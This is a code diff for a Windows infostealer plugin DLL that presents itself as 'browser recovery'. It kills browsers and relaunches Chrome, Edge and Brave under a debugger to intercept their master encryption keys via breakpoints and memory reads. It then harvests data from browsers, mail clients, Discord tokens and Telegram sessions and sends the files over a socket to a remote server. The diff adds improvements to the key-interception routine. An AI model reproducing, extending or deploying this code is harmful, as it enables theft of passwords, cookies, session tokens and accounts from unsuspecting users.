@@ -82,28 +82,23 @@ static void send_status(SOCKET sock, const std::string& msg) {
 
 static void send_data_in_chunks(SOCKET sock, const std::string& relPath, const uint8_t* data, size_t data_size) {
     if (sock == INVALID_SOCKET) return;
-
     const size_t CHUNK_SIZE = 1024 * 1024; // 1MB chunks
     size_t total_sent = 0;
-
     do {
         size_t current_chunk = (data_size - total_sent > CHUNK_SIZE) ? CHUNK_SIZE : (data_size - total_sent);
         uint32_t pathLen = (uint32_t)relPath.size();
         uint32_t totalSize = sizeof(uint32_t) + pathLen + (uint32_t)current_chunk;
-
         std::vector<uint8_t> packet(sizeof(PacketHeader) + totalSize);
         PacketHeader* header = (PacketHeader*)packet.data();
         header->signature = PACKET_SIGNATURE;
         header->type = PACKET_TYPE_RECOVERY_FILE;
         header->size = totalSize;
-
         uint8_t* ptr = packet.data() + sizeof(PacketHeader);
         *(uint32_t*)ptr = pathLen;
         ptr += sizeof(uint32_t);
         memcpy(ptr, relPath.c_str(), pathLen);
         ptr += pathLen;
         if (current_chunk > 0) memcpy(ptr, data + total_sent, current_chunk);
-
         send_with_mutex(sock, (const char*)packet.data(), (int)packet.size());
         total_sent += current_chunk;
     } while (total_sent < data_size);
@@ -120,16 +115,12 @@ static void send_string_to_server(SOCKET sock, const std::string& relPath, const
 static void send_file_from_disk(SOCKET sock, const fs::path& filePath, const std::string& relPath) {
     std::ifstream ifs(filePath, std::ios::binary);
     if (!ifs) return;
-
-    const size_t CHUNK_SIZE = 1024 * 1024; // 1MB
+    const size_t CHUNK_SIZE = 1024 * 1024;
     std::vector<uint8_t> buffer(CHUNK_SIZE);
-
     while (ifs) {
         ifs.read((char*)buffer.data(), CHUNK_SIZE);
         std::streamsize bytes_read = ifs.gcount();
-        if (bytes_read > 0) {
-            send_data_in_chunks(sock, relPath, buffer.data(), (size_t)bytes_read);
-        }
+        if (bytes_read > 0) send_data_in_chunks(sock, relPath, buffer.data(), (size_t)bytes_read);
     }
 }
 
@@ -254,119 +245,6 @@ void extract_firefox_wallets(SOCKET sock, const fs::path& profile_path, const st
 // Forward declarations for helper functions
 std::vector<uint8_t> decrypt_blob(const std::vector<uint8_t>& blob, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera);
 
-void run_recovery(SOCKET sock) {
-    if (sock != INVALID_SOCKET) {
-        std::string start_msg = "{\"action\":\"recovery_start\"}\r\n";
-        send_with_mutex(sock, start_msg.c_str(), (int)start_msg.size());
-    }
-
-    send_status(sock, "Starting browser recovery...");
-
-    std::vector<BrowserConfig> configs = {
-        {"New Outlook", "", {}, "", {L"Microsoft", L"Olk", L"EBWebView"}, "mail_clients/Outlook", "outlook_tmp", false, false, false, false},
-        {"Google Chrome", "chrome.exe", {L"Google\\Chrome\\Application\\chrome.exe"}, "chrome.dll", {L"Google", L"Chrome", L"User Data"}, "browsers/Google Chrome", "chrome_tmp", false, false, true, false},
-        {"Microsoft Edge", "msedge.exe", {L"Microsoft\\Edge\\Application\\msedge.exe"}, "msedge.dll", {L"Microsoft", L"Edge", L"User Data"}, "browsers/Microsoft Edge", "edge_tmp", true, false, true, false},
-        {"Brave", "brave.exe", {L"BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"Brave-Browser\\Application\\brave.exe"}, "chrome.dll", {L"BraveSoftware", L"Brave-Browser", L"User Data"}, "browsers/Brave", "brave_tmp", false, false, true, false},
-        {"Opera Stable", "opera.exe", {L"Opera\\launcher.exe"}, "launcher_lib.dll", {L"Opera Software", L"Opera Stable"}, "browsers/Opera Stable", "opera_tmp", false, true, false, false},
-        {"Opera GX", "opera.exe", {L"Opera GX\\launcher.exe"}, "launcher_lib.dll", {L"Opera Software", L"Opera GX Stable"}, "browsers/Opera GX", "operagx_tmp", false, true, false, false},
-        {"Mozilla Firefox", "firefox.exe", {L"Mozilla Firefox\\firefox.exe"}, "nss3.dll", {L"Mozilla", L"Firefox", L"Profiles"}, "browsers/Mozilla Firefox", "firefox_tmp", false, true, false, true},
-        {"Waterfox", "waterfox.exe", {L"Waterfox\\waterfox.exe"}, "nss3.dll", {L"Waterfox", L"Profiles"}, "browsers/Waterfox", "waterfox_tmp", false, true, false, true},
-        {"LibreWolf", "librewolf.exe", {L"LibreWolf\\librewolf.exe"}, "nss3.dll", {L"LibreWolf", L"Profiles"}, "browsers/LibreWolf", "librewolf_tmp", false, true, false, true},
-        {"Mozilla Thunderbird", "thunderbird.exe", {L"Mozilla Thunderbird\\thunderbird.exe"}, "nss3.dll", {L"Thunderbird", L"Profiles"}, "mail_clients/Thunderbird", "thunderbird_tmp", false, true, false, true},
-        {"Yandex Browser", "browser.exe", {L"Yandex\\YandexBrowser\\Application\\browser.exe"}, "browser.dll", {L"Yandex", L"YandexBrowser", L"User Data"}, "browsers/Yandex Browser", "yandex_tmp", false, false, false, false}
-    };
-
-    send_status(sock, "Terminating browser processes...");
-    kill_processes_by_name("chrome.exe");
-    kill_processes_by_name("msedge.exe");
-    kill_processes_by_name("brave.exe");
-    kill_processes_by_name("opera.exe");
-
-    for (const auto& config : configs) {
-        std::wstring user_data_dir = get_user_data_dir(config.user_data_subdir, config.use_roaming);
-        if (user_data_dir.empty() && config.name == "New Outlook") {
-             user_data_dir = get_user_data_dir({L"Microsoft", L"Olk", L"EBWebView"}, false);
-        }
-        if (user_data_dir.empty()) continue;
-
-        send_status(sock, "Checking " + config.name + "...");
-
-        std::vector<uint8_t> v10_key;
-        bool is_dpapi = false;
-        bool has_key = get_v10_key(user_data_dir, v10_key, is_dpapi);
-
-        if (config.is_firefox) {
-            extract_firefox_data(sock, config, user_data_dir);
-            continue;
-        }
-
-        if (has_key && !config.has_abe) {
-            extract_all_profiles_data(sock, {}, config, user_data_dir);
-            continue;
-        }
-
-        if (!config.has_abe) {
-             extract_all_profiles_data(sock, {}, config, user_data_dir);
-             continue;
-        }
-
-        std::wstring exe_path = L"";
-        std::vector<std::wstring> search_roots = get_search_roots();
-        for (const auto& path : config.exe_paths) {
-            for (const auto& root : search_roots) {
-                fs::path full_path = fs::path(root) / path;
-                if (fs::exists(full_path)) { exe_path = full_path.wstring(); break; }
-            }
-            if (!exe_path.empty()) break;
-        }
-
-        if (exe_path.empty()) continue;
-
-        STARTUPINFOW si = { sizeof(si) };
-        PROCESS_INFORMATION pi = { 0 };
-        std::wstring cmd_line = L"\"" + exe_path + L"\" --no-sandbox --disable-gpu --no-first-run --no-default-browser-check";
-        std::vector<wchar_t> cmd_buffer(cmd_line.begin(), cmd_line.end());
-        cmd_buffer.push_back(0);
-
-        if (CreateProcessW(NULL, cmd_buffer.data(), NULL, NULL, FALSE, DEBUG_PROCESS | CREATE_NO_WINDOW | CREATE_BREAKAWAY_FROM_JOB, NULL, NULL, &si, &pi)) {
-            std::vector<uint8_t> v20_key = debug_loop_get_key(pi.dwProcessId, config);
-            TerminateProcess(pi.hProcess, 0);
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-            if (!v20_key.empty()) {
-                send_status(sock, "Master key intercepted for " + config.name);
-                extract_all_profiles_data(sock, v20_key, config, user_data_dir);
-            } else {
-                send_status(sock, "Failed to intercept key for " + config.name + " (Timeout or not found)");
-            }
-        }
-    }
-
-    struct DiscordConfig { std::string name; std::wstring subdir; };
-    std::vector<DiscordConfig> discords = { {"Discord", L"discord"}, {"Discord Canary", L"discordcanary"}, {"Discord PTB", L"discordptb"}, {"Lightcord", L"Lightcord"} };
-    wchar_t* appdata;
-    if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &appdata) == S_OK) {
-        fs::path roaming(appdata);
-        CoTaskMemFree(appdata);
-        for (const auto& d : discords) {
-            fs::path p = roaming / d.subdir;
-            if (fs::exists(p)) extract_discord_tokens(sock, p.wstring(), d.name);
-        }
-    }
-    extract_telegram_session(sock);
-    send_status(sock, "Recovery completed.");
-}
-
-extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
-    run_recovery(sock);
-}
-
-extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmdJson) {
-    // Stub
-}
-
-// Implementations of helper functions (ported from original main.cpp and modified)
-
 void kill_processes_by_name(const std::string& target_name) {
     std::wstring target_name_w(target_name.begin(), target_name.end());
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -376,15 +254,104 @@ void kill_processes_by_name(const std::string& target_name) {
             do {
                 if (_wcsicmp(pe.szExeFile, target_name_w.c_str()) == 0) {
                     HANDLE h_proc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
-                    if (h_proc) {
-                        TerminateProcess(h_proc, 0);
-                        CloseHandle(h_proc);
-                    }
+                    if (h_proc) { TerminateProcess(h_proc, 0); CloseHandle(h_proc); }
                 }
             } while (Process32NextW(snapshot, &pe));
         }
         CloseHandle(snapshot);
     }
+}
+
+static std::wstring get_browser_exe_path(const std::wstring& browser_name) {
+    std::wstring path = L""; HKEY hKey;
+    std::wstring subkey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + browser_name;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        wchar_t buffer[MAX_PATH]; DWORD size = sizeof(buffer);
+        if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) path = buffer;
+        RegCloseKey(hKey);
+    }
+    if (path.empty()) {
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            wchar_t buffer[MAX_PATH]; DWORD size = sizeof(buffer);
+            if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) path = buffer;
+            RegCloseKey(hKey);
+        }
+    }
+    return path;
+}
+
+void run_recovery(SOCKET sock) {
+    if (sock != INVALID_SOCKET) {
+        std::string start_msg = "{\"action\":\"recovery_start\"}\r\n";
+        send_with_mutex(sock, start_msg.c_str(), (int)start_msg.size());
+    }
+    send_status(sock, "Starting browser recovery...");
+    std::vector<BrowserConfig> configs = {
+        {"Google Chrome", "chrome.exe", {L"chrome.exe"}, "chrome.dll", {L"Google", L"Chrome", L"User Data"}, "browsers/Google Chrome", "chrome_tmp", false, false, true, false},
+        {"Microsoft Edge", "msedge.exe", {L"msedge.exe"}, "msedge.dll", {L"Microsoft", L"Edge", L"User Data"}, "browsers/Microsoft Edge", "edge_tmp", true, false, true, false},
+        {"Brave", "brave.exe", {L"brave.exe"}, "chrome.dll", {L"BraveSoftware", L"Brave-Browser", L"User Data"}, "browsers/Brave", "brave_tmp", false, false, true, false},
+        {"Opera Stable", "opera.exe", {L"launcher.exe"}, "launcher_lib.dll", {L"Opera Software", L"Opera Stable"}, "browsers/Opera Stable", "opera_tmp", false, true, false, false},
+        {"Opera GX", "opera.exe", {L"launcher.exe"}, "launcher_lib.dll", {L"Opera Software", L"Opera GX Stable"}, "browsers/Opera GX", "operagx_tmp", false, true, false, false},
+        {"New Outlook", "", {}, "", {L"Microsoft", L"Olk", L"EBWebView"}, "mail_clients/Outlook", "outlook_tmp", false, false, false, false},
+        {"Mozilla Firefox", "firefox.exe", {L"firefox.exe"}, "nss3.dll", {L"Mozilla", L"Firefox", L"Profiles"}, "browsers/Mozilla Firefox", "firefox_tmp", false, true, false, true},
+        {"Waterfox", "waterfox.exe", {L"waterfox.exe"}, "nss3.dll", {L"Waterfox", L"Profiles"}, "browsers/Waterfox", "waterfox_tmp", false, true, false, true},
+        {"LibreWolf", "librewolf.exe", {L"librewolf.exe"}, "nss3.dll", {L"LibreWolf", L"Profiles"}, "browsers/LibreWolf", "librewolf_tmp", false, true, false, true},
+        {"Mozilla Thunderbird", "thunderbird.exe", {L"thunderbird.exe"}, "nss3.dll", {L"Thunderbird", L"Profiles"}, "mail_clients/Thunderbird", "thunderbird_tmp", false, true, false, true},
+        {"Yandex Browser", "browser.exe", {L"browser.exe"}, "browser.dll", {L"Yandex", L"YandexBrowser", L"User Data"}, "browsers/Yandex Browser", "yandex_tmp", false, false, false, false}
+    };
+    send_status(sock, "Terminating browser processes...");
+    kill_processes_by_name("chrome.exe"); kill_processes_by_name("msedge.exe"); kill_processes_by_name("brave.exe"); kill_processes_by_name("opera.exe"); kill_processes_by_name("browser.exe");
+    for (const auto& config : configs) {
+        std::wstring user_data_dir = get_user_data_dir(config.user_data_subdir, config.use_roaming);
+        if (user_data_dir.empty() && config.name == "New Outlook") user_data_dir = get_user_data_dir({L"Microsoft", L"Olk", L"EBWebView"}, false);
+        if (user_data_dir.empty()) continue;
+        send_status(sock, "Checking " + config.name + "...");
+        std::vector<uint8_t> v10_key; bool is_dpapi = false; bool has_key = get_v10_key(user_data_dir, v10_key, is_dpapi);
+        if (config.is_firefox) { extract_firefox_data(sock, config, user_data_dir); continue; }
+        if (has_key && !config.has_abe) { extract_all_profiles_data(sock, {}, config, user_data_dir); continue; }
+        if (!config.has_abe) { extract_all_profiles_data(sock, {}, config, user_data_dir); continue; }
+        std::wstring exe_path = L"";
+        if (!config.process_name.empty()) exe_path = get_browser_exe_path(utf8_to_wide(config.process_name));
+        if (exe_path.empty()) {
+            std::vector<std::wstring> search_roots = get_search_roots();
+            for (const auto& rel_path : config.exe_paths) {
+                for (const auto& root : search_roots) {
+                    fs::path full = fs::path(root) / rel_path;
+                    if (fs::exists(full)) { exe_path = full.wstring(); break; }
+                }
+                if (!exe_path.empty()) break;
+            }
+        }
+        if (exe_path.empty()) continue;
+        STARTUPINFOW si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 };
+        std::wstring cmd_line = L"\"" + exe_path + L"\" --no-sandbox --disable-gpu --no-first-run --no-default-browser-check";
+        std::vector<wchar_t> cmd_buffer(cmd_line.begin(), cmd_line.end()); cmd_buffer.push_back(0);
+        if (CreateProcessW(NULL, cmd_buffer.data(), NULL, NULL, FALSE, DEBUG_PROCESS | CREATE_NO_WINDOW | CREATE_BREAKAWAY_FROM_JOB, NULL, NULL, &si, &pi)) {
+            std::vector<uint8_t> v20_key = debug_loop_get_key(pi.dwProcessId, config);
+            TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+            if (!v20_key.empty()) {
+                send_status(sock, "Master key intercepted for " + config.name);
+                extract_all_profiles_data(sock, v20_key, config, user_data_dir);
+            } else {
+                send_status(sock, "Failed to intercept key for " + config.name + " (Timeout)");
+            }
+        }
+    }
+    struct DiscordConfig { std::string name; std::wstring subdir; };
+    std::vector<DiscordConfig> discords = { {"Discord", L"discord"}, {"Discord Canary", L"discordcanary"}, {"Discord PTB", L"discordptb"}, {"Lightcord", L"Lightcord"} };
+    wchar_t* appdata; if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &appdata) == S_OK) {
+        fs::path roaming(appdata); CoTaskMemFree(appdata);
+        for (const auto& d : discords) { fs::path p = roaming / d.subdir; if (fs::exists(p)) extract_discord_tokens(sock, p.wstring(), d.name); }
+    }
+    extract_telegram_session(sock); send_status(sock, "Recovery completed.");
+}
+
+extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
+    run_recovery(sock);
+}
+
+extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmdJson) {
+    // Stub
 }
 
 std::vector<uint32_t> get_all_threads(uint32_t process_id) {
@@ -583,11 +550,12 @@ size_t find_target_address(HANDLE h_process, void* base_addr, const std::string&
 
 std::vector<uint8_t> debug_loop_get_key(uint32_t process_id, const BrowserConfig& config) {
     DEBUG_EVENT debug_event = { 0 };
-    size_t target_address = 0;
+    size_t target_rva = 0;
     std::vector<uint8_t> extracted_key;
     DWORD startTime = GetTickCount();
     const DWORD timeout = 30000;
     std::map<uint32_t, HANDLE> process_handles;
+    std::map<uint32_t, size_t> dll_bases;
     std::set<size_t> patched_addresses;
     while (GetTickCount() - startTime < timeout) {
         if (!WaitForDebugEvent(&debug_event, 100)) continue;
@@ -600,19 +568,23 @@ std::vector<uint8_t> debug_loop_get_key(uint32_t process_id, const BrowserConfig
             if (debug_event.dwProcessId == process_id) { ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE); return extracted_key; }
             break;
         case LOAD_DLL_DEBUG_EVENT: {
-            if (target_address == 0) {
-                wchar_t buffer[MAX_PATH];
-                if (GetFinalPathNameByHandleW(debug_event.u.LoadDll.hFile, buffer, MAX_PATH, 0)) {
-                    std::wstring path = buffer; std::wstring dll_name_w(config.dll_name.begin(), config.dll_name.end());
-                    if (path.find(dll_name_w) != std::wstring::npos) {
-                        target_address = find_target_address(process_handles[debug_event.dwProcessId], debug_event.u.LoadDll.lpBaseOfDll, config.name);
-                        if (target_address != 0) {
-                            std::vector<uint32_t> threads = get_all_threads(debug_event.dwProcessId);
-                            for (uint32_t thread_id : threads) set_hardware_breakpoint(thread_id, target_address);
-                            uint8_t int3 = 0xCC; SIZE_T written;
-                            WriteProcessMemory(process_handles[debug_event.dwProcessId], (LPVOID)target_address, &int3, 1, &written);
-                            patched_addresses.insert(target_address);
-                        }
+            wchar_t buffer[MAX_PATH];
+            if (GetFinalPathNameByHandleW(debug_event.u.LoadDll.hFile, buffer, MAX_PATH, 0)) {
+                std::wstring path = buffer;
+                std::wstring dll_name_w(config.dll_name.begin(), config.dll_name.end());
+                if (path.find(dll_name_w) != std::wstring::npos) {
+                    dll_bases[debug_event.dwProcessId] = (size_t)debug_event.u.LoadDll.lpBaseOfDll;
+                    if (target_rva == 0) {
+                        size_t addr = find_target_address(process_handles[debug_event.dwProcessId], debug_event.u.LoadDll.lpBaseOfDll, config.name);
+                        if (addr != 0) target_rva = addr - (size_t)debug_event.u.LoadDll.lpBaseOfDll;
+                    }
+                    if (target_rva != 0) {
+                        size_t target_addr = (size_t)debug_event.u.LoadDll.lpBaseOfDll + target_rva;
+                        std::vector<uint32_t> threads = get_all_threads(debug_event.dwProcessId);
+                        for (uint32_t thread_id : threads) set_hardware_breakpoint(thread_id, target_addr);
+                        uint8_t int3 = 0xCC; SIZE_T written;
+                        WriteProcessMemory(process_handles[debug_event.dwProcessId], (LPVOID)target_addr, &int3, 1, &written);
+                        patched_addresses.insert(target_addr);
                     }
                 }
             }
@@ -622,22 +594,31 @@ std::vector<uint8_t> debug_loop_get_key(uint32_t process_id, const BrowserConfig
             uint32_t code = debug_event.u.Exception.ExceptionRecord.ExceptionCode;
             size_t addr = (size_t)debug_event.u.Exception.ExceptionRecord.ExceptionAddress;
             if (code == EXCEPTION_SINGLE_STEP || code == EXCEPTION_BREAKPOINT) {
-                if (addr == target_address || (code == EXCEPTION_BREAKPOINT && patched_addresses.count(addr))) {
+                size_t current_target = 0;
+                if (target_rva != 0 && dll_bases.count(debug_event.dwProcessId)) current_target = dll_bases[debug_event.dwProcessId] + target_rva;
+                if (addr == current_target || (code == EXCEPTION_BREAKPOINT && patched_addresses.count(addr))) {
                     HANDLE h_thread = OpenThread(THREAD_GET_CONTEXT, FALSE, debug_event.dwThreadId);
                     if (h_thread) {
                         CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_FULL;
                         if (GetThreadContext(h_thread, &ctx)) {
-                            std::vector<DWORD64> key_ptrs = config.use_r14 ? std::vector<DWORD64>{ctx.R14, ctx.R15} : std::vector<DWORD64>{ctx.R15, ctx.R14};
-                            for (DWORD64 ptr : key_ptrs) {
+                            std::vector<DWORD64> candidates = {ctx.R15, ctx.R14, ctx.Rdx, ctx.Rax};
+                            for (DWORD64 ptr : candidates) {
                                 if (ptr == 0) continue;
-                                std::vector<uint8_t> buffer(32); SIZE_T bytes_read = 0;
-                                if (ReadProcessMemory(process_handles[debug_event.dwProcessId], (LPCVOID)ptr, buffer.data(), 32, &bytes_read)) {
-                                    DWORD64 data_ptr = ptr; uint64_t length = *(uint64_t*)&buffer[8];
-                                    if (length == 32) data_ptr = *(DWORD64*)&buffer[0];
-                                    std::vector<uint8_t> key(32);
-                                    if (ReadProcessMemory(process_handles[debug_event.dwProcessId], (LPCVOID)data_ptr, key.data(), 32, &bytes_read)) {
-                                        bool all_zero = true; for (uint8_t b : key) if (b != 0) { all_zero = false; break; }
-                                        if (!all_zero) { extracted_key = key; break; }
+                                std::vector<uint8_t> buf(32); SIZE_T br = 0;
+                                if (ReadProcessMemory(process_handles[debug_event.dwProcessId], (LPCVOID)ptr, buf.data(), 32, &br)) {
+                                    auto check_key = [&](const std::vector<uint8_t>& k) {
+                                        if (k.size() != 32) return false;
+                                        for (uint8_t b : k) if (b != 0) return true;
+                                        return false;
+                                    };
+                                    if (check_key(buf)) { extracted_key = buf; break; }
+                                    uint64_t actual_ptr = *(uint64_t*)&buf[0];
+                                    uint64_t length = *(uint64_t*)&buf[8];
+                                    if (length == 32 && actual_ptr != 0) {
+                                        std::vector<uint8_t> key2(32);
+                                        if (ReadProcessMemory(process_handles[debug_event.dwProcessId], (LPCVOID)actual_ptr, key2.data(), 32, &br)) {
+                                            if (check_key(key2)) { extracted_key = key2; break; }
+                                        }
                                     }
                                 }
                             }
@@ -645,7 +626,7 @@ std::vector<uint8_t> debug_loop_get_key(uint32_t process_id, const BrowserConfig
                         CloseHandle(h_thread);
                     }
                     if (!extracted_key.empty()) {
-                        clear_hardware_breakpoints(debug_event.dwProcessId);
+                        for (auto const& [pid, handle] : process_handles) clear_hardware_breakpoints(pid);
                         ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
                         return extracted_key;
                     }
